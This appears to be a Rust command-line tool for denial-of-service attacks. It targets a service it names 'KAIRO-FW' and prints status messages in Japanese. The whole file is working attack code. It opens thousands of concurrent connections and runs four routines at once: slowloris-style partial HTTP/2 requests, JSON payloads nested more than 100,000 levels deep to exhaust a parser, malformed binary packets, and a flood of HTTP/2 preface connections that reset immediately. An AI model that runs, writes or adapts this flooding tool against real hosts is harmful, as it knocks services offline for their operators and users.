use clap::Parser;
use rand::prelude::*;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::time;

#[derive(Parser, Debug)]
#[command(author, version, about = "Mythos v9999 - The Ultimate KAIRO-FW Killer")]
struct Args {
    #[arg(short, long, default_value = "127.0.0.1")]
    ip: String,
    #[arg(short, long, default_value_t = 11451)]
    port: u16,
    #[arg(short, long, default_value_t = 20000)]
    max_conns: u32,
}

static ACTIVE: AtomicU64 = AtomicU64::new(0);
static SENT: AtomicU64 = AtomicU64::new(0);

#[tokio::main]
async fn main() {
    let args = Args::parse();
    println!("【MYTHOS EXTINCTION v9999】最大パワーで直撃を開始します。");
    println!("Target: {}:{}", args.ip, args.port);
    println!("Max Conns: {} | Hardware: Ryzen 4200U Mode", args.max_conns);

    let start = Instant::now();
    let _monitor = tokio::spawn(async move {
        loop {
            time::sleep(Duration::from_secs(5)).await;
            println!("[LIVE] 接続: {:>6} | 送信: {:>10} bytes | 経過: {}秒", 
                     ACTIVE.load(Ordering::Relaxed), SENT.load(Ordering::Relaxed), start.elapsed().as_secs());
        }
    });

    let workers = 8; 
    let mut tasks = vec![];

    for i in 0..workers {
        let ip = args.ip.clone();
        let port = args.port;
        let conns_per_worker = args.max_conns / workers;

        tasks.push(tokio::spawn(async move {
            match i % 4 {
                0 => ultra_slowloris_chaos(&ip, port, conns_per_worker).await,
                1 => parser_annihilator_v9999(&ip, port, conns_per_worker).await,
                2 => recursive_flatbuffers_bomb(&ip, port, conns_per_worker).await,
                _ => rapid_reset_flood(&ip, port, conns_per_worker).await,
            }
        }));
    }

    let _ = tokio::signal::ctrl_c().await;
    println!("\n[!] 攻撃中断。KAIRO-FWの残骸を確認してください。");
}

async fn ultra_slowloris_chaos(ip: &str, port: u16, max: u32) {
    let mut conns = vec![];
    for _ in 0..max.min(3000) {
        if let Ok(mut s) = TcpStream::connect((ip, port)).await {
            let _ = s.write_all(b"POST /chaos HTTP/2\r\nHost: localhost\r\nUser-Agent: Mythos-v9999-Chaos\r\n").await;
            conns.push(s);
            ACTIVE.fetch_add(1, Ordering::Relaxed);
        }
    }
    loop {
        for s in &mut conns {
            let chaos_byte = [rand::random::<u8>()];
            let _ = s.write_all(&chaos_byte).await;
            SENT.fetch_add(1, Ordering::Relaxed);
        }
        time::sleep(Duration::from_millis(100)).await;
    }
}

async fn parser_annihilator_v9999(ip: &str, port: u16, max: u32) {
    loop {
        for _ in 0..max / 5 {
            if let Ok(mut s) = TcpStream::connect((ip, port)).await {
                let depth = thread_rng().gen_range(100000..150000);
                let payload = build_ultimate_bomb(depth);
                let _ = s.write_all(&payload).await;
                SENT.fetch_add(payload.len() as u64, Ordering::Relaxed);
                let _ = s.shutdown().await;
                ACTIVE.fetch_add(1, Ordering::Relaxed);
            }
        }
        time::sleep(Duration::from_millis(500)).await;
    }
}

fn build_ultimate_bomb(depth: usize) -> Vec<u8> {
    let mut s = String::with_capacity(depth * 10 + 10000);
    s.push_str("{\"mythos_final\":");
    for i in 0..depth { s.push_str(&format!("{{\"k{}\":", i)); }
    s.push_str("\"EXTINCTION\"");
    for _ in 0..depth { s.push('}'); }
    s.push_str(",\"chaos_padding\":\"");
    s.push_str(&"A".repeat(5000));
    s.push_str("\"}");
    s.into_bytes()
}

async fn recursive_flatbuffers_bomb(ip: &str, port: u16, max: u32) {
    loop {
        for _ in 0..max / 5 {
            if let Ok(mut s) = TcpStream::connect((ip, port)).await {
                let mut bomb = vec![0u8; 64];
                bomb[0..4].copy_from_slice(&[0x10, 0x00, 0x00, 0x00]);
                bomb[4..8].copy_from_slice(b"AITP");
                let _ = s.write_all(&bomb).await;
                SENT.fetch_add(64, Ordering::Relaxed);
            }
        }
        time::sleep(Duration::from_millis(100)).await;
    }
}

async fn rapid_reset_flood(ip: &str, port: u16, max: u32) {
    loop {
        for _ in 0..max / 2 {
            if let Ok(mut s) = TcpStream::connect((ip, port)).await {
                let _ = s.write_all(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n").await;
                let _ = s.shutdown().await;
                SENT.fetch_add(24, Ordering::Relaxed);
            }
        }
        time::sleep(Duration::from_millis(10)).await;
    }
}
